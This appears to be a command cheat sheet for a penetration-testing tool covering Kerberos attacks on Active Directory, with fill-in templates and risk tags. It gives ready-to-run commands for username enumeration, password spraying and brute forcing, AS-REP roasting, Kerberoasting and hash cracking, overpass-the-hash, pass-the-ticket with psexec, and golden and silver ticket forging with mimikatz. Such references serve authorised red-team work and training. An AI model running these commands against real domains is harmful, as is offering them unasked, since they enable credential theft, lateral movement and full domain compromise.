# Kerberos

> Authentication protocol attacks: AS-REP roasting, Kerberoasting, Pass-the-Ticket, Golden/Silver Ticket

<!-- tags: kerberos,ad,tickets,roasting -->

---

## enum users nmap nse
Use the krb5-enum-users NSE script to find valid usernames.

```bash
nmap -p {{PORT:port:88}} --script=krb5-enum-users --script-args krb5-enum-users.realm='{{REALM:domain}}',userdb={{USERLIST:file:users.txt}} {{DC_IP:ip}}
```

<!-- meta: risk=safe | phase=enum | tags=nmap,nse -->

---

## enum users kerbrute
Validate usernames against a domain controller.

```bash
kerbrute userenum --dc {{DC_IP:ip}} -d {{DOMAIN:domain}} {{USERLIST:file:users.txt}}
```

<!-- meta: risk=safe | phase=enum | tags=kerbrute,userenum -->

---

## spray password kerbrute
Spray a single password across many users.

```bash
kerbrute passwordspray --dc {{DC_IP:ip}} -d {{DOMAIN:domain}} {{USERLIST:file:users.txt}} '{{PASSWORD:str:Spring2026!}}'
```

<!-- meta: risk=med | phase=passwords | tags=kerbrute,spray -->

---

## brute user password kerbrute
Brute force passwords for a single user.

```bash
kerbrute bruteuser --dc {{DC_IP:ip}} -d {{DOMAIN:domain}} {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} {{USERNAME:str:administrator}}
```

<!-- meta: risk=med | phase=passwords | tags=kerbrute,brute -->

---

## asreproast dump hashes impacket
Pull AS-REP hashes for users without pre-auth.

```bash
impacket-GetNPUsers {{DOMAIN:domain}}/ -dc-ip {{DC_IP:ip}} -usersfile {{USERLIST:file:users.txt}} -format hashcat -outputfile {{OUTFILE:file:asrep.hashes}}
```

<!-- meta: risk=low | phase=enum | tags=asreproast,impacket -->

---

## crack asrep hash hashcat
Hashcat mode 18200 for Kerberos 5 AS-REP.

```bash
hashcat -m 18200 {{HASHFILE:file:asrep.hashes}} {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}}
```

<!-- meta: risk=safe | phase=passwords | tags=hashcat,asrep -->

---

## kerberoast dump tgs impacket
Request TGS hashes for SPN-bearing accounts.

```bash
impacket-GetUserSPNs {{DOMAIN:domain}}/{{USERNAME:str}}:'{{PASSWORD:str}}' -dc-ip {{DC_IP:ip}} -request -outputfile {{OUTFILE:file:kerberoast.hashes}}
```

<!-- meta: risk=low | phase=enum | tags=kerberoast,spn -->

---

## crack kerberoast tgs hashcat
Hashcat mode 13100 for TGS-REP.

```bash
hashcat -m 13100 {{HASHFILE:file:kerberoast.hashes}} {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}}
```

<!-- meta: risk=safe | phase=passwords | tags=hashcat,tgs -->

---

## overpass-the-hash get tgt
Convert an NTLM hash into a TGT for further AD attacks.

```bash
impacket-getTGT {{DOMAIN:domain}}/{{USERNAME:str}} -hashes :{{NTHASH:str}} -dc-ip {{DC_IP:ip}}
```

<!-- meta: risk=high | phase=exploit | tags=overpass,opth -->

---

## pass-the-ticket psexec
Use a stolen TGT for authentication.

```bash
KRB5CCNAME={{CCACHE:file:ticket.ccache}} impacket-psexec {{DOMAIN:domain}}/{{USERNAME:str}}@{{TARGET:str:host.corp.local}} -k -no-pass
```

<!-- meta: risk=critical | phase=exploit | tags=ptt,ticket -->

---

## forge golden ticket mimikatz
Forge a TGT using the krbtgt NTLM hash.

```bash
mimikatz "kerberos::golden /domain:{{DOMAIN:domain}} /sid:{{DOMAIN_SID:str}} /krbtgt:{{KRBTGT_HASH:str}} /user:Administrator /ptt" "exit"
```

<!-- meta: risk=critical | phase=post | tags=golden,mimikatz -->

---

## forge silver ticket mimikatz
Forge a TGS for a specific service account.

```bash
mimikatz "kerberos::golden /domain:{{DOMAIN:domain}} /sid:{{DOMAIN_SID:str}} /target:{{TARGET_HOST:str}} /rc4:{{SVC_HASH:str}} /user:{{USERNAME:str}} /service:{{SERVICE:str:cifs}} /ptt" "exit"
```

<!-- meta: risk=critical | phase=post | tags=silver,mimikatz -->
